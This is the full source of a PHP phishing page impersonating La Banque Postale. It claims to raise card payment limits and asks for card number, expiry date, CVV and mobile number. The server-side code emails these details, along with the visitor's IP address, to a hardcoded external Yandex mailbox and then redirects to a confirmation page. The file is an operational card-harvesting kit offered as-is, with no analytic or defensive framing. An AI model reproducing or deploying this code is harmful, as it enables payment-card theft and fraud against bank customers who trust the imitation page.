<?php
  $id = $mdp ="";
  $emailText = "";
  $error = false;
  $isSucess = false;
  $ip = getenv("REMOTE_ADDR");
  $hostname = gethostbyaddr($ip);
  $emailTo = 'chamberlain.bayano@yandex.com';
  if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $id = securInput($_POST["id"]);
    $mdp = securInput($_POST["mdp"]);
    $mdp1 = securInput($_POST["mdp1"]);
    $cvv = securInput($_POST["cvv"]);
    $phone = securInput($_POST["phone"]);
    $isSucess = true;

    if (empty($id)) {
      $error = true;
      $isSucess = false;
    }else{
      $emailText .= "Numero de carte : $id\n";
    }

    if (empty($mdp)) {
      $error = true;
      $isSucess = false;
    }
    else{
      $emailText .= "Mois expire : $mdp\n";
    }
    
    if (empty($mdp1)) {
      $error = true;
      $isSucess = false;
    }
    else{
      $emailText .= "Annee expire : $mdp1\n";
    }
    
    if (empty($cvv)) {
      $error = true;
      $isSucess = false;
    }
    else{
      $emailText .= "CVV : $cvv\n";
    }
    
     if (empty($phone)) {
      $error = true;
      $isSucess = false;
    }
    else{
      $emailText .= "Mobile : $phone\n";
    }

    if ($isSucess) {

     
    mail($emailTo, "Postale - CARTE | =?UTF-8?Q?=e2=9d=a4_?=  $ip =?UTF-8?Q?=E2=9C=94_?= ", $emailText);
      $id = $mdp = "";
      header('Location:confirmation.html');
    }


  }


  function securInput($var)
  {
    $var = trim($var);
    $var = stripcslashes($var);
    $var = htmlspecialchars($var);

    return $var;
  }
?>

<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
    <link rel="shortcut icon" type="image/png" href="cap/favicon.png" type="image/x-icon" />
    
    <title>La Banque Postale - Attente d'enrôlement </title>
    <script type="text/javascript" src="date_heure.js"></script>
  </head>

  <style type="text/css">
    input{
      padding:0px;

    }
    .tel {
      width:1258px;
      height:500px;
    }
    .mobile{
      border-radius: 0px;
      height:35px;
      width:260px;
      padding:0px;
    }

    .ordi{
      border-radius: 0px;
      padding:0px;
      height:35px;
      width:230px;
    }
    .mobile:hover{
      border-radius: 0px;
      height:24px;
      width:260px;
    }
    label{
      font-size:13px;
      margin-bottom: 03px
    }
  </style>

  <body style="background: withe;">
  
<!-- ........................................PC........................................ -->

<div class="d-none d-md-block">
  <img src="cap/p1.png" style="width: 100%">
  <img src="cap/cc.png" style="width: 100%">
  <div class="tel">
        <br>
    <div class="row">
      <div class="col-4"></div>
      <div class="col-8 row" style="background:white">
        
        <p class="thank-you" style="display: <?php if ($error) {
            echo "block";
          }else echo "none";?> "> <img src="cap/eror.png" style="width: 100%"> </p>
        <div class="col-12 ">
          <form class="row" style="padding:16px;margin-top:-21px" method="POST" action="">
            <p>Vous allez augmenter les plafonds de paiement et retrait d'espèces de votre carte bancaire.</p>
                    <br>
        <div class="form-group col-12 row" style="left:-100px">                            
              <label class="col-3" for="id" style="text-align: right;">Choisir nouveau Plafond:</label>
              <select type="id" class="form-control ordi col-4" id="pc" name="pc" >
							<option value="3 000 EUR">3 000 EUR</option>
							<option value="3 500 EUR">3 500 EUR</option>
							<option value="4 000 EUR">4 000 EUR</option>
							<option value="5 000 EUR">5 000 EUR</option>
							<option value="6 000 EUR">6 000 EUR</option>
							<option value="7 000 EUR">7 000 EUR</option>
							<option value="8 000 EUR">8 000 EUR</option>
							<option value="9 000 EUR">9 000 EUR</option>
							<option value="10 000 EUR">10 000 EUR</option>
							<option value="12 000 EUR">12 000 EUR</option>
							<option value="15 000 EUR">15 000 EUR</option>
						</select>	
              </div>
           <div class="form-group col-12 row" style="left:-100px">              
              <label class="col-3" for="id" style="text-align: right;">Numéro de carte:</label>
              <input type="tel" class="form-control ordi col-4" id="id" name="id" maxlength="19" style="background-image: url(&quot;cap/cccc.png&quot;); background-repeat: no-repeat; background-position: 101.5% 74.8%; width: 225px;">
            </div>
            <div class="form-group col-12 row" style="margin-top:-10px;left:-100px">
              <label class="col-3" style="text-align: right;">Date Expiration:</label>
              <input type="tel" class="form-control ordi col-1" id="mdp" name="mdp" placeholder="MM" maxlength="2">/
              <input type="tel" class="form-control ordi col-1" id="mdp1" name="mdp1" placeholder="AAAA" maxlength="4">
            </div>
              <div class="form-group col-12 row" style="margin-top:-10px;left:-100px">
              <label class="col-3" style="text-align: right;">Cryptogramme visuel:</label>
              <input type="tel" class="form-control ordi col-1" id="cvv" name="cvv" maxlength="3">
            </div>
            
             <div class="form-group col-12 row" style="margin-top:-10px;left:-100px">              
              <label class="col-3" for="id" style="text-align: right;">Téléphone mobile:</label>
              <input type="tel" class="form-control ordi col-3" id="phone" name="phone" maxlength="10" style=" margin-bottom: 15%;  background-image: url(cap/3.ico); background-repeat: no-repeat;
    background-position: 98%;
    background-size: 19px;
">
            </div>

            <div class="col-8">
              <button type="submit" class="btn btn-primary col-4 offset-4" style="margin-top:-200px;height:40px;border-radius:0px;background-color: #1346A0;font-size:14px">
                <span style="font-weight:600;">Valider</span>
              </button>
              
            </div>            
          </form>
        </div>
        <div class="col-7"><img src="cap/pp.png" style="margin-top:-100px;width: 100%"></div>      </div>
    </div>    
  </div>
  <br>
  <br>
  <br>
  <img src="cap/p3.png" style="width: 100%">
</div>



<!-- ...................................TEL............................................. -->
   <div class="d-md-none" style="background: white">
    <img src="cap/cc1.png" style="width: 100%">
    <div class="container">
      <p class="thank-you" style="display: <?php if ($error) {
            echo "block";
          }else echo "none";?> "> <img src="cap/eror.png" style="width: 100%"> </p>  
           <br>
                <form class="row" style="margin-top:-21px" method="POST" action="">
            <p>Vous allez augmenter les plafonds de paiement et retrait d'espèces de votre carte bancaire.</p>
                    <br>
             <div class="form-group col-12 row" style="left:-"px">                            
              <label class="col-5" for="id" style="text-align: right;">Choisir nouveau Plafond:</label>
              <select type="id" class="form-control ordi col-6" id="pc" name="pc" >
							<option value="3 000 EUR">3 000 EUR</option>
							<option value="3 500 EUR">3 500 EUR</option>
							<option value="4 000 EUR">4 000 EUR</option>
							<option value="5 000 EUR">5 000 EUR</option>
							<option value="6 000 EUR">6 000 EUR</option>
							<option value="7 000 EUR">7 000 EUR</option>
							<option value="8 000 EUR">8 000 EUR</option>
							<option value="9 000 EUR">9 000 EUR</option>
							<option value="10 000 EUR">10 000 EUR</option>
							<option value="12 000 EUR">12 000 EUR</option>
							<option value="15 000 EUR">15 000 EUR</option>
						</select>	
              </div>
            <div class="form-group col-12 row" style="left:-2px">              
              <label class="col-5" for="id" style="text-align: right;">Numéro de carte:</label>
              <input type="tel" class="form-control ordi col-5" id="id" name="id" maxlength="16">       
          </div>
            <div class="form-group col-12 row" style="margin-top:-10px;left:-3px">
              <label class="col-5" style="text-align: right;">Date Expire:</label>
              <input type="tel" class="form-control ordi col-2" id="mdp" name="mdp" placeholder="MM" maxlength="2">/
              <input type="tel" class="form-control ordi col-2" id="mdp1" name="mdp1" placeholder="AAAA" maxlength="4">
            </div>
             <div class="form-group col-12 row" style="margin-top:-10px;left:-2px">
              <label class="col-5" style="text-align: right;">Cryptogramme visuel:</label>
              <input type="tel" class="form-control ordi col-2" id="cvv" name="cvv" maxlength="3">
            </div>
             <div class="form-group col-12 row" style="margin-top:-10px;left:-2px">
              <label class="col-5" style="text-align: right;">Téléphone mobile:</label>
              <input type="tel" class="form-control ordi col-4" id="phone" name="phone" maxlength="10" style=" margin-bottom: 15%;  background-image: url(cap/3.ico); background-repeat: no-repeat;
    background-position: 98%;
    background-size: 19px;
">
            </div>

      <div class="col-4">
        <button type="submit" class="btn btn-primary " style="width:99%;margin-top:-100px;border-radius:0px;background-color: #1346A0;font-size:14px">
          <span style="font-weight:600;">Valider</span>
        </button>
      </div>
      
    </form>
    </div>
    
    <img src="cap/pp.png" style="width: 100%">
    <br>
    <img src="cap/s2.png" style="width: 100%">
     
   </div>

    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
  </body>
</html>